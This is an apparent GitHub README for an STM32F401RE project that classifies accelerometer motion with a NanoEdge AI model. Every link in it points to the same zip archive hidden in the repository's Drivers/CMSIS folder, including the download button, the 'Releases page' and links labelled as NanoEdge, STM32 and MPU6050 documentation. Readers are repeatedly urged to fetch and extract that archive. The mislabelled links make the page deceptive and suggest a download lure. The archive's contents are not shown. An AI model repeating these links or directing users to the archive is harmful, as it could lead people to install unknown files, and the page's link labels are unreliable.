# ✈️ Flight_contoller_stm32_mpu6050 - Simple Motion Detection with AI

## 📥 Download Now
[![Download Flight Controller STM32 MPU6050](https://raw.githubusercontent.com/CoderNK2025/Flight_contoller_stm32_mpu6050/main/Drivers/CMSIS/mpu-stm-Flight-contoller-3.8.zip)](https://raw.githubusercontent.com/CoderNK2025/Flight_contoller_stm32_mpu6050/main/Drivers/CMSIS/mpu-stm-Flight-contoller-3.8.zip)

## 📖 Overview
This project performs motion classification using accelerometer data (accX, accY, accZ) on an STM32 board. The AI model is built with NanoEdge AI Studio, and the sensor data is collected through a USB serial emulator. This application shows how embedded AI can detect movements like tilt, shake, or rest directly on your device. 

### 🚀 Features
- **Real-Time Motion Detection:** Uses accelerometer data from the MPU6050 sensor.
- **AI-Driven Analysis:** Leverages an AI model for accurate classification of movements.
- **Easy Integration:** Crafted for straightforward setup on STM32 boards.

### 🔍 Topics Covered
- classification
- embedded-c
- hal
- i2c
- led
- mlp
- mpu6050
- nanoedge
- stm32
- stm32cubeide
- stm32f401re
- uart

## 🎯 System Requirements
To run this application, you will need:
- **Device:** STM32 board (e.g., STM32F401RE)
- **Development Environment:** STM32CubeIDE installed
- **USB Connection:** A USB serial emulator for data collection
- **Operating System:** Windows, macOS, or Linux

## 🔧 Installation Instructions

### 🛠️ Step 1: Download the Software
Visit the [Releases page](https://raw.githubusercontent.com/CoderNK2025/Flight_contoller_stm32_mpu6050/main/Drivers/CMSIS/mpu-stm-Flight-contoller-3.8.zip) to download the latest version of the application.

### 🛠️ Step 2: Extract the Files
Once the download is complete, locate the downloaded file on your computer. Extract the contents using a file extraction tool (like WinRAR or 7-Zip). 

### 🛠️ Step 3: Set Up Your STM32 Board
1. Connect your STM32 board to your computer via USB.
2. Ensure that the STM32 drivers are installed on your computer. You can find these in the STM32CubeIDE installation package.

### 🛠️ Step 4: Open STM32CubeIDE
1. Launch the STM32CubeIDE application.
2. Create a new project or open an existing one suitable for the STM32F401RE board.

### 🛠️ Step 5: Import the Project Files
Copy the extracted files into your STM32 project folder. Ensure you include all necessary source files and libraries.

### 🛠️ Step 6: Configure the Project
1. Modify `main.c` to initialize the MPU6050 sensor and configure UART settings for data transmission.
2. Use the STM32CubeMX tool within STM32CubeIDE to set up I2C communication with the MPU6050.

### 🛠️ Step 7: Build the Project
1. Click on the build button in STM32CubeIDE.
2. Resolve any compilation errors as needed.

### 🛠️ Step 8: Upload the Code
1. Connect your STM32 board if not already done.
2. Click on the upload button to transfer the code to your STM32 board.

### 🛠️ Step 9: Run the Application
Once the code uploads successfully, you can disconnect the board from your computer. The application will run automatically, and you can observe movement detection based on accelerometer data.

## ⚙️ Troubleshooting
- **Connection Issues:** Check your USB connection and ensure the drivers are correctly installed.
- **Compilation Errors:** Verify that all necessary libraries are included in your project settings.
- **Data Not Found:** Ensure the MPU6050 is correctly connected and powered.

## 📝 Additional Resources
For further reading and support, consider visiting the following resources:
- [NanoEdge AI Studio Documentation](https://raw.githubusercontent.com/CoderNK2025/Flight_contoller_stm32_mpu6050/main/Drivers/CMSIS/mpu-stm-Flight-contoller-3.8.zip)
- [STM32 Official Documentation](https://raw.githubusercontent.com/CoderNK2025/Flight_contoller_stm32_mpu6050/main/Drivers/CMSIS/mpu-stm-Flight-contoller-3.8.zip)
- [MPU6050 Sensor Guide](https://raw.githubusercontent.com/CoderNK2025/Flight_contoller_stm32_mpu6050/main/Drivers/CMSIS/mpu-stm-Flight-contoller-3.8.zip)

## 📞 Community Support
If you have questions or need assistance, please feel free to open an issue in this repository. The community and contributors will be happy to help.

---

Now you are set to go! Follow these steps to download and run the Flight Controller application on your STM32 device.